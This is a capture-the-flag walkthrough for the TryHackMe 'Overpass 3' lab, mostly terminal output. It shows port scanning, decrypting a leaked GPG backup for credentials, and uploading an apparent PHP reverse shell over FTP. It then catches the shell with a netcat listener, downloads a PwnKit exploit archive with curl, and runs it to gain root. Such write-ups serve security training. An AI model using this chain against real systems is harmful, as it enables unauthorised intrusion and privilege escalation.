## Overpass 3 - Hosting
https://tryhackme.com/room/overpass3hosting

## Enum
```
nmap -Pn -sC -sV 10.10.125.148 -vv

Scanning ip.thm (10.10.125.148) [1000 ports]
Discovered open port 80/tcp on 10.10.125.148
Discovered open port 22/tcp on 10.10.125.148
Discovered open port 21/tcp on 10.10.125.148

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 61 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   3072 de:5b:0e:b5:40:aa:43:4d:2a:83:31:14:20:77:9c:a1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDfSHQR3OtIeAUFx18phN/nfAIQ2uGHuJs0epoqF184E4Xr8fkjSFJHdA6GsVyGUjdlPqylT8Lpa+UhSSegb8sm1So8Nz42bthsftsOxMQVb/tpQzMUfjcxQOiyVmgxfEqs2Zzdv6GtxwgZWhKHt7T369ejxnVrZhn0m6jzQNfRhVoQe/jC20RKvBf8l8s6/SusbZR5SFfsg71KyrSKOXOxs12GhXkdbP32K3sXVEpWgfCfmIZAc2ZxNtL5uPCM4AOfjIFJHl1z9EX04ZjQ1rMzzOh9pD/b+W2mXt2nQGzRPnc8LyGDE0hFtw4+lBCoiH8zIt14S7dwbFFV1mWxbtZXVf7JhPiZDM2vBfqyowsDZ5oc2qyR+JEU4pqeVhRygs41isej/el19G8+ehz4W07KR97eM2omB25JehO7E4tpX1l8Imjs1XjqhhVuGE2tru/p62SRQOKzRZ19MCIFPxleSLorrHq/uuKdvd8j6rm0A9BrCsiB6gmPfal6Kr55vlU=
|   256 f4:b5:a6:60:f4:d1:bf:e2:85:2e:2e:7e:5f:4c:ce:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAPAji9Nkb2U9TeP47Pz7BEa943WGOeu5XrRrTV0+CS0eGfNQyZkK6ZICNdeov65c2NWFPFsZTFjO8Sg+e2n/lM=
|   256 29:e6:61:09:ed:8a:88:2b:55:74:f2:b7:33:ae:df:c8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM/U6Td7C0nC8tiqS0Eejd+gQ3rjSyQW2DvcN0eoMFLS
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.37 ((centos))
|_http-title: Overpass Hosting
| http-methods:
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos)
Service Info: OS: Unix
```
```
ffuf -u http://ip.thm/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
________________________________________________

backups                 [Status: 301, Size: 230, Words: 14, Lines: 8, Duration: 545ms]
cgi-bin/                [Status: 403, Size: 217, Words: 16, Lines: 10, Duration: 1364ms]
index.html              [Status: 200, Size: 1770, Words: 443, Lines: 37, Duration: 432ms]
:: Progress: [4713/4713] :: Job [1/1] :: 90 req/sec :: Duration: [0:01:40] :: Errors: 64 ::
```
![image](https://user-images.githubusercontent.com/6504854/190057176-cfde4be3-7520-4a8d-81fe-229d9faf3ae5.png)

```
-rw-rw-r--  1 root root 10366 Nov  9  2020  CustomerDetails.xlsx.gpg
-rw-------  1 root root  3522 Nov  9  2020  priv.key
```
🏴 I did unzip and got 2 files.

```
gpg --import priv.key
gpg: key C9AE71AB3180BC08: public key "Paradox <paradox@overpass.thm>" imported
gpg: key C9AE71AB3180BC08: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1

gpg --decrypt CustomerDetails.xlsx.gpg > CustomerDetails.xlsx
gpg: encrypted with 2048-bit RSA key, ID 9E86A1C63FB96335, created 2020-11-08
      "Paradox <paradox@overpass.thm>"
```
![image](https://user-images.githubusercontent.com/6504854/190057658-dffe44ad-9582-4054-ac9a-02e429e11510.png)

🏴 I found three credentials.

```
ssh ip.thm -l paradox
paradox@ip.thm's password:
Permission denied, please try again.

ssh ip.thm -l 0day
0day@ip.thm's password:
Permission denied, please try again.

ssh ip.thm -l muirlandoracle
muirlandoracle@ip.thm's password:
Permission denied, please try again.
```
😞


```
ftp
ftp> open 10.10.125.148
Connected to 10.10.125.148.
220 (vsFTPd 3.0.3)
Name (10.10.125.148:root): paradox
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||33519|)
150 Here comes the directory listing.
drwxrwxrwx    3 48       48             94 Nov 17  2020 .
drwxrwxrwx    3 48       48             94 Nov 17  2020 ..
drwxr-xr-x    2 48       48             24 Nov 08  2020 backups
-rw-r--r--    1 0        0           65591 Nov 17  2020 hallway.jpg
-rw-r--r--    1 0        0            1770 Nov 17  2020 index.html
-rw-r--r--    1 0        0             576 Nov 17  2020 main.css
-rw-r--r--    1 0        0            2511 Nov 17  2020 overpass.svg
226 Directory send OK.
ftp> upload 1.php
?Invalid command.
ftp> put 1.php 1.php
local: 1.php remote: 1.php
229 Entering Extended Passive Mode (|||24600|)
150 Ok to send data.
100% |****************************************************************************|  3456       14.71 MiB/s    00:00 ETA
226 Transfer complete.
3456 bytes sent in 00:00 (3.75 KiB/s)
ftp> exit
221 Goodbye.
```
🏴 Nothing to be important, I could upload files. 😃

```
curl ip.thm/1.php
```

## Flag
```
nc -lnvp 4444
listening on [any] 4444 ...
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: cannot set terminal process group (869): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4$ python3 -c 'import pty; pty.spawn("/bin/bash")';
python3 -c 'import pty; pty.spawn("/bin/bash")';

bash-4.4$ cd /home
cd /home

bash-4.4$ ls -la
ls -la
total 0
drwxr-xr-x.  4 root    root     34 Nov  8  2020 .
drwxr-xr-x. 17 root    root    244 Nov 18  2020 ..
drwx------.  3 james   james   112 Nov 17  2020 james
drwx------.  4 paradox paradox 203 Nov 18  2020 paradox

bash-4.4$ cd para*
cd para*
bash: cd: paradox: Permission denied

bash-4.4$ su paradox
su paradox
Password: S****************

[paradox@localhost home]$ cd paradox
cd paradox

[paradox@localhost ~]$ ls -la
ls -la
total 56
drwx------. 4 paradox paradox   203 Nov 18  2020 .
drwxr-xr-x. 4 root    root       34 Nov  8  2020 ..
-rw-rw-r--. 1 paradox paradox 13353 Nov  8  2020 backup.zip
lrwxrwxrwx. 1 paradox paradox     9 Nov  8  2020 .bash_history -> /dev/null
-rw-r--r--. 1 paradox paradox    18 Nov  8  2019 .bash_logout
-rw-r--r--. 1 paradox paradox   141 Nov  8  2019 .bash_profile
-rw-r--r--. 1 paradox paradox   312 Nov  8  2019 .bashrc
-rw-rw-r--. 1 paradox paradox 10019 Nov  8  2020 CustomerDetails.xlsx
-rw-rw-r--. 1 paradox paradox 10366 Nov  8  2020 CustomerDetails.xlsx.gpg
drwx------. 4 paradox paradox   132 Nov  8  2020 .gnupg
-rw-------. 1 paradox paradox  3522 Nov  8  2020 priv.key
drwx------  2 paradox paradox    47 Nov 18  2020 .ssh

[paradox@localhost ~]$ find / -name "*flag*" -type f 2>/dev/null
find / -name "*flag*" -type f 2>/dev/null
/proc/sys/kernel/acpi_video_flags
/proc/kpageflags
/sys/devices/pnp0/00:06/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/vif-0/net/eth0/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/usr/bin/pflags
/usr/sbin/grub2-set-bootflag
/usr/share/man/man1/grub2-set-bootflag.1.gz
/usr/share/httpd/web.flag

[paradox@localhost ~]$ cat /usr/share/httpd/web.flag
cat /usr/share/httpd/web.flag
thm{*****************************}

[paradox@localhost ~]$ sudo -l
sudo -l
Sorry, user paradox may not run sudo on localhost.

[paradox@localhost ~]$ ls -la /usr/bin/pkexec
ls -la /usr/bin/pkexec
-rwsr-xr-x. 1 root root 35624 Apr  9  2020 /usr/bin/pkexec

[paradox@localhost ~]$ curl http://10.10.10.10/1.zip -o 1.zip
[paradox@localhost ~]$ unzip 1.zip
unzip 1.zip
Archive:  1.zip
   creating: polkit/
 extracting: polkit/cve-2021-4034.c.gz
  inflating: polkit/GCONV_PATH=./pwnkit.so:.

[paradox@localhost polkit]$ ./cve-2021-4034
./cve-2021-4034
sh-4.4# find / -name "*flag" -type f 2>/dev/null
find / -name "*flag" -type f 2>/dev/null
/root/root.flag
/usr/sbin/grub2-set-bootflag
/usr/share/httpd/web.flag
/home/james/user.flag
sh-4.4# cat /root/root.flag
cat /root/root.flag
thm{********************************}
sh-4.4# cat /home/james/user.flag
cat /home/james/user.flag
thm{********************************}
sh-4.4#
```
